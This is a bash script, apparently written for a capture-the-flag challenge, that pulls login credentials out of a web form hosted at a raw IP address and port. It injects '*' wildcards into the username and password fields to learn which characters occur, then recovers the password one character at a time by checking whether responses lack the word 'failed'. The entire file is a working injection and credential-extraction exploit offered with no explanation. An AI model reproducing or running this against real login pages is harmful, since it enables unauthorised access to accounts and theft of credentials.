alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{{"
username_alphabet=''
password_alphabet=''
current_username=''
current_password=''

credentials_match() {
    echo $(curl -i -s -k -X POST \
        --data "username=${1}&password=${2}" \
        $'http://206.189.20.127:31677/login' |
        grep -ia failed)
    return 0
}

echo "====> Optimizing the username alphabet"
# filter the alphabet for chars actually in the username
for i in {0..65}; do
    trying=${alphabet:${i}%66:1};
    isinside=$(credentials_match "*${trying}*" "*");
    if [[ -z "$isinside" ]]; then username_alphabet+="${trying}"; echo "[+]${trying}"; fi
done
# show the working alphabet
echo "[+] Username alphabet: ${username_alphabet} (${#username_alphabet})";

echo "====> Optimizing the password alphabet"
# filter the alphabet for chars actually in the password
for i in {0..65}; do
    trying=${alphabet:${i}%66:1};
    isinside=$(credentials_match "*" "*${trying}*");
    if [[ -z "$isinside" ]]; then password_alphabet+="${trying}"; echo "[+]${trying}"; fi
done
# show the working alphabet
echo "[+] Password alphabet: ${password_alphabet} (${#password_alphabet})";

echo "====> Bruteforcing the username"
# loop only on the relevant characters
# for i in {0..1000}; do
#     trying=${username_alphabet:${i}%${#username_alphabet}:1};
#     isinside=$(credentials_match "${current_username}${trying}*" "*");
#     if [[ -z "$isinside" ]]; then current_username+="${trying}"; echo "[+]${current_username}"; fi
# done

echo "====> Bruteforcing the password"
for i in {0..1000}; do
    trying=${password_alphabet:${i}%${#password_alphabet}:1};
    isinside=$(credentials_match "*" "${current_password}${trying}*");
    if [[ -z "$isinside" ]]; then current_password+="${trying}"; echo "[+]${current_password}"; fi
done
